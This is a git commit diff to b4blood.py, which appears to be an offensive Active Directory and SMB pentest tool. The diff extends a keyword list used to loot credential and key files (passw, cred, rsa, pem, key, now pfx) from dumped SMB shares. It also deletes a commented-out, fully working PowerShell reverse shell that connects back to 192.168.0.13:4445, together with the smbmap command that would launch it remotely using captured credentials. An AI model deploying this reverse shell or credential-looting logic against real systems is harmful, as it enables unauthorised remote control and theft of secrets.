1a38eaffdd490a37be149fdedb19edfbbb1b57ac
moloch54 <123097488+moloch54@users.noreply.github.com>
2023-02-28 15:20:07 +0100

    Update b4blood.py

--- b4blood.py
+++ b4blood.py
@@ -446,7 +446,7 @@ if len(contenu) !=0:
 			with open(f"shares/shares_{user}.txt","r") as fichier3:
 				shares=fichier3.readlines()
 			os.chdir("smb_dump")
-			file_content="admin,account,compte,cred,user,passw,note,vbs,ps1,bat,exe,conf,cfg,rsa,pem,key,xml,xslx,doc,docx,zip,txt,pdf".split(",")
+			file_content="admin,account,compte,cred,user,passw,note,vbs,ps1,bat,exe,conf,cfg,rsa,pem,key,xml,xslx,doc,docx,zip,txt,pdf,pfx".split(",")
 			for share in shares:
 				share=share.replace("\n","")
 				share=share.replace(" ","")
@@ -518,9 +518,6 @@ if len(contenu) !=0:
 	printf(" All creds:", green)
 	print(yellow+contenu+white)
 	
-	#cmd='powershell -command "function ReverseShellClean {if ($c.Connected -eq $true) {$c.Close()}; if ($p.ExitCode -ne $null) {$p.Close()}; exit; };$a=""""192.168.0.13""""; $port=""""4445"""";$c=New-Object system.net.sockets.tcpclient;$c.connect($a,$port) ;$s=$c.GetStream();$nb=New-Object System.Byte[] $c.ReceiveBufferSize  ;$p=New-Object System.Diagnostics.Process  ;$p.StartInfo.FileName=""""cmd.exe""""  ;$p.StartInfo.RedirectStandardInput=1  ;$p.StartInfo.RedirectStandardOutput=1;$p.StartInfo.UseShellExecute=0  ;$p.Start()  ;$is=$p.StandardInput  ;$os=$p.StandardOutput  ;Start-Sleep 1  ;$e=new-object System.Text.AsciiEncoding  ;while($os.Peek() -ne -1){$out += $e.GetString($os.Read())} $s.Write($e.GetBytes($out),0,$out.Length)  ;$out=$null;$done=$false;while (-not $done) {if ($c.Connected -ne $true) {cleanup} $pos=0;$i=1; while (($i -gt 0) -and ($pos -lt $nb.Length)) { $read=$s.Read($nb,$pos,$nb.Length - $pos); $pos+=$read;if ($pos -and ($nb[0..$($pos-1)] -contains 10)) {break}}  if ($pos -gt 0){ $string=$e.GetString($nb,0,$pos); $is.write($string); start-sleep 1; if ($p.ExitCode -ne $null) {ReverseShellClean} else {  $out=$e.GetString($os.Read());while($os.Peek() -ne -1){ $out += $e.GetString($os.Read());if ($out -eq $string) {$out="""" """"}}  $s.Write($e.GetBytes($out),0,$out.length); $out=$null; $string=$null}} else {ReverseShellClean}};"'
-	#os.system(f"smbmap -u {user} -p {passw} -d {Domain_Name} -H {ip_to_scan} -x '{cmd}'")
-
 
 
  
